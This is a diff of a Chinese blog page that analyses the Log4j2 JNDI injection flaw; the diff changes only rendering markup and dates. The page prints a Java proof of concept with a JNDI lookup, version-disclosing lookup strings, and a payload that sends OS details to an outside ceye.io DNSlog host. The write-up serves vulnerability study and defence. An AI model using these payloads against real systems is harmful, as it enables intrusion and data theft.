@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.109.0"><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.129.0"><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -390,17 +390,17 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">log4j2Exploit</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">run</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${jndi:ldap://127.0.0.1:3890/test}&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">log4j2Exploit</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.LogManager</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.Logger</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">run</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Logger</span><span class="w"> </span><span class="n">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LogManager</span><span class="p">.</span><span class="na">getLogger</span><span class="p">(</span><span class="n">run</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">logger</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&#34;${jndi:ldap://127.0.0.1:3890/test}&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>跟进<code>logger.error()→logIfEnabled()→isEnabled()→filter()</code> 中判断了当前调用的日志等级是否高于等于配置文件中配置的。（intLevel的值是日志等级越高，值就越小）
 <img src="/images/image-20220116152734.png" alt="">
@@ -438,9 +438,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">runtime</span><span class="o">}</span> <span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">vm</span><span class="o">}</span> <span class="n">$</span><span class="o">{</span><span class="n">java</span><span class="o">:</span><span class="n">os</span><span class="o">}</span> <span class="c1">//获取java运行时版本，jvm版本，和操作系统版本
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">$</span><span class="o">{</span><span class="n">sys</span><span class="o">:</span><span class="n">java</span><span class="o">.</span><span class="na">version</span><span class="o">}</span>
-</span></span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$</span><span class="p">{</span><span class="n">java</span><span class="p">:</span><span class="n">runtime</span><span class="p">}</span><span class="w"> </span><span class="n">$</span><span class="p">{</span><span class="n">java</span><span class="p">:</span><span class="n">vm</span><span class="p">}</span><span class="w"> </span><span class="n">$</span><span class="p">{</span><span class="n">java</span><span class="p">:</span><span class="n">os</span><span class="p">}</span><span class="w"> </span><span class="c1">//获取java运行时版本，jvm版本，和操作系统版本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">$</span><span class="p">{</span><span class="n">sys</span><span class="p">:</span><span class="n">java</span><span class="p">.</span><span class="na">version</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>外带数据: <code>${jndi:ldap://${java:os}.2lnhn2.ceye.io}</code></p>
 <p>还可利用Bundle协议读取项目配置文件来获取敏感信息。</p>
@@ -496,22 +496,22 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Spring</span><span class="o">-</span><span class="n">Boot</span><span class="o">-</span><span class="n">strater</span><span class="o">-</span><span class="n">log4j2</span>
-</span></span><span class="line"><span class="cl"><span class="n">Apache</span> <span class="n">Struts2</span>
-</span></span><span class="line"><span class="cl"><span class="n">Apache</span> <span class="n">Solr</span>
-</span></span><span class="line"><span class="cl"><span class="n">Apache</span> <span class="n">Flink</span>
-</span></span><span class="line"><span class="cl"><span class="n">Apache</span> <span class="n">Druid</span>
-</span></span><span class="line"><span class="cl"><span class="n">ElasticSearch</span>
-</span></span><span class="line"><span class="cl"><span class="n">flume</span>
-</span></span><span class="line"><span class="cl"><span class="n">dubbo</span>
-</span></span><span class="line"><span class="cl"><span class="n">Redis</span>
-</span></span><span class="line"><span class="cl"><span class="n">logstash</span>
-</span></span><span class="line"><span class="cl"><span class="n">kafka</span>
-</span></span><span class="line"><span class="cl"><span class="n">VMware</span> <span class="n">Horizon</span>
-</span></span><span class="line"><span class="cl"><span class="n">VMware</span> <span class="n">vCenter</span> <span class="n">Server</span>
-</span></span><span class="line"><span class="cl"><span class="n">VMware</span> <span class="n">HCX</span>
-</span></span><span class="line"><span class="cl"><span class="n">VMware</span> <span class="n">NSX</span><span class="o">-</span><span class="n">T</span> <span class="n">Data</span> <span class="n">Center</span>
-</span></span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Spring</span><span class="o">-</span><span class="n">Boot</span><span class="o">-</span><span class="n">strater</span><span class="o">-</span><span class="n">log4j2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Apache</span><span class="w"> </span><span class="n">Struts2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Apache</span><span class="w"> </span><span class="n">Solr</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Apache</span><span class="w"> </span><span class="n">Flink</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Apache</span><span class="w"> </span><span class="n">Druid</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ElasticSearch</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">flume</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">dubbo</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Redis</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">logstash</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">kafka</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">VMware</span><span class="w"> </span><span class="n">Horizon</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">VMware</span><span class="w"> </span><span class="n">vCenter</span><span class="w"> </span><span class="n">Server</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">VMware</span><span class="w"> </span><span class="n">HCX</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">VMware</span><span class="w"> </span><span class="n">NSX</span><span class="o">-</span><span class="n">T</span><span class="w"> </span><span class="n">Data</span><span class="w"> </span><span class="n">Center</span><span class="w">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5MDc1NDc1MQ==&amp;mid=2247491068&amp;idx=1&amp;sn=c41b8b9e561d5ddaa539b41dc661ba2b&amp;chksm=9007862ca7700f3a302398570f65ee438010c2e92a9096ae2870174cb2c79beab018663d47f5#rd" target="_blank" rel="noopener">受影响的主流应用软件</a></p>
 <h2 id="修复与防御"><a href="#修复与防御" class="anchor-link">#</a><a href="#contents:修复与防御" class="headings">修复与防御</a></h2>
@@ -697,7 +697,7 @@
     
 
 
-            <div class="site-info">©&nbsp;2024&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
+            <div class="site-info">©&nbsp;2025&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
               </div>
 
             
